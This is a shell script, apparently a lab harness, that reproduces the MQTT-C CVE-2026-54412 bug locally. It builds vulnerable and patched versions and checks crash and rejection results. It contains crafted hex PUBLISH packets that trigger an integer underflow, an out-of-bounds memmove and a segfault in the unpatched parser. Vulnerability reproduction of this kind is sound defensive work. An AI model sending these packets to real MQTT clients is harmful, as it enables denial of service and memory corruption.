#!/bin/sh
# frontier lab runner — MQTT-C CVE-2026-54412 (verbatim pinned upstream source).
# No upstream source line is edited. All work is local; no socket or broker.
set -u
cd "$(dirname "$0")" || exit 2

VULN_TAR="src/mqtt-1.1.6.tar.gz"
FIX_TAR="src/mqtt-1.1.7.tar.gz"
VULN_TAR_SHA="fad0b15f3f58317dd3b0399b37efab7c582074744871f093b9fdf28c74667f7d"
FIX_TAR_SHA="1e5d8a91d312724ceea4fe183680cabfdd47a10b5cf28e3834a8bec66e89e02c"
VULN_SRC_SHA="34ee9f4d573b2ac8c627c966c0112eb54f8620023f25d9cbeebb92e713a8e741"
FIX_SRC_SHA="d8f3f8cabe8ee5edcd80acfef75f7ee0f345751832a895d4cdc99dff6be1cfde"
ATTACK="3004ffff0000"          # QoS0 PUBLISH, remaining_length=4, topic size 0xFFFF
ATTACK_QOS1="3204ffff0000"     # QoS1 variant: reads packet id past the topic
SAFE="3006000161626300"        # QoS0 PUBLISH, topic "a", payload "bc"
PASS=0
FAIL=0

sha() { sha256sum "$1" | cut -d' ' -f1; }
ok()   { PASS=$((PASS + 1)); echo "PASS $1"; }
bad()  { FAIL=$((FAIL + 1)); echo "FAIL $1"; }
expect_eq() { if [ "$2" = "$3" ]; then ok "$1"; else bad "$1 (got '$2' want '$3')"; fi; }

for pair in "$VULN_TAR:$VULN_TAR_SHA" "$FIX_TAR:$FIX_TAR_SHA"; do
    file=${pair%%:*}
    want=${pair#*:}
    if [ -f "$file" ] && [ "$(sha "$file")" = "$want" ]; then
        ok "tarball $file sha256"
    else
        bad "tarball $file sha256 (refetch per PROVENANCE.md)"
        echo "RESULT PASS=$PASS FAIL=$FAIL"
        exit 1
    fi
done

rm -rf build
mkdir -p build/vuln build/fixed
tar xzf "$VULN_TAR" -C build/vuln --strip-components=1 \
    MQTT-C-1.1.6/src/mqtt.c MQTT-C-1.1.6/include/mqtt.h MQTT-C-1.1.6/include/mqtt_pal.h
tar xzf "$FIX_TAR" -C build/fixed --strip-components=1 \
    MQTT-C-1.1.7/src/mqtt.c MQTT-C-1.1.7/include/mqtt.h MQTT-C-1.1.7/include/mqtt_pal.h
expect_eq "vulnerable mqtt.c verbatim sha256" "$(sha build/vuln/src/mqtt.c)" "$VULN_SRC_SHA"
expect_eq "fixed mqtt.c verbatim sha256" "$(sha build/fixed/src/mqtt.c)" "$FIX_SRC_SHA"

CC=${CC:-gcc}
CFLAGS="-std=c99 -O0 -g -fno-omit-frame-pointer -pthread"
ASAN="-fsanitize=address"
for side in vuln fixed; do
    if $CC $CFLAGS -Ibuild/$side/include harness/driver.c build/$side/src/mqtt.c -o build/$side/plain > build/$side/plain-build.log 2>&1; then
        ok "$side plain build"
    else
        bad "$side plain build"
    fi
    if $CC $CFLAGS $ASAN -Ibuild/$side/include harness/driver.c build/$side/src/mqtt.c -o build/$side/asan > build/$side/asan-build.log 2>&1; then
        ok "$side ASan build"
    else
        bad "$side ASan build"
    fi
done

# Rung 2: observed state failure without the receive-loop memmove.
./build/vuln/asan "$ATTACK" unpack > build/vuln/unpack-attack.log 2>&1
grep -q 'UNPACK rv=4294967302 topic_size=65535 message_size=4294901763' build/vuln/unpack-attack.log \
    && ok "vuln unpack underflow payload size 4294901763" || bad "vuln unpack underflow"
./build/fixed/asan "$ATTACK" unpack > build/fixed/unpack-attack.log 2>&1
grep -q 'UNPACK rv=-2147483636 topic_size=65535 message_size=0' build/fixed/unpack-attack.log \
    && ok "fixed unpack rejects malformed PUBLISH" || bad "fixed unpack rejects malformed PUBLISH"
./build/vuln/asan "$SAFE" unpack > build/vuln/unpack-safe.log 2>&1
grep -q 'UNPACK rv=8 topic_size=1 message_size=3' build/vuln/unpack-safe.log \
    && ok "safe unpack control" || bad "safe unpack control"

# Rung 3: ASan in the verbatim receive loop on the crafted PUBLISH packet.
./build/vuln/asan "$ATTACK" > build/vuln/asan-attack.log 2>&1
VULN_RC=$?
grep -q 'AddressSanitizer: negative-size-param: (size=-4294967296)' build/vuln/asan-attack.log \
    && ok "vuln ASan negative-size-param -4294967296" || bad "vuln ASan negative-size-param"
grep -q '__mqtt_recv build/vuln/src/mqtt.c:880' build/vuln/asan-attack.log \
    && ok "vuln ASan frame at verbatim mqtt.c:880" || bad "vuln ASan frame at verbatim mqtt.c:880"
if [ "$VULN_RC" -ne 0 ]; then ok "vuln ASan nonzero exit ($VULN_RC)"; else bad "vuln ASan nonzero exit"; fi

./build/vuln/plain "$ATTACK" > build/vuln/plain-attack.log 2>&1
PLAIN_RC=$?
expect_eq "vuln plain crash rc" "$PLAIN_RC" "139"

./build/fixed/asan "$ATTACK" > build/fixed/asan-attack.log 2>&1
FIXED_RC=$?
if [ "$FIXED_RC" -eq 0 ]; then ok "fixed ASan clean exit"; else bad "fixed ASan clean exit ($FIXED_RC)"; fi
grep -q 'callbacks=0' build/fixed/asan-attack.log \
    && ok "fixed callback not invoked" || bad "fixed callback not invoked"
grep -q 'error=-2147483636' build/fixed/asan-attack.log \
    && ok "fixed error is malformed response" || bad "fixed error is malformed response"
if grep -q AddressSanitizer build/fixed/asan-attack.log; then bad "fixed no ASan report"; else ok "fixed no ASan report"; fi

./build/vuln/asan "$SAFE" > build/vuln/asan-safe.log 2>&1
SAFE_RC=$?
if [ "$SAFE_RC" -eq 0 ]; then ok "vuln safe packet clean exit"; else bad "vuln safe packet clean exit ($SAFE_RC)"; fi
grep -q 'callbacks=1 topic_size=1 message_size=3' build/vuln/asan-safe.log \
    && ok "vuln safe packet normal parse" || bad "vuln safe packet normal parse"

# QoS1 variant: the wild topic pointer is dereferenced for the packet id.
./build/vuln/asan "$ATTACK_QOS1" > build/vuln/asan-attack-qos1.log 2>&1
grep -q '__mqtt_unpack_uint16 build/vuln/src/mqtt.c:1748' build/vuln/asan-attack-qos1.log \
    && ok "qos1 ASan read at verbatim mqtt.c:1748" || bad "qos1 ASan read at verbatim mqtt.c:1748"
./build/fixed/asan "$ATTACK_QOS1" > build/fixed/asan-attack-qos1.log 2>&1
FIXED_QOS1_RC=$?
if [ "$FIXED_QOS1_RC" -eq 0 ] && ! grep -q AddressSanitizer build/fixed/asan-attack-qos1.log; then
    ok "fixed qos1 clean"
else
    bad "fixed qos1 clean"
fi

echo "RESULT PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ]
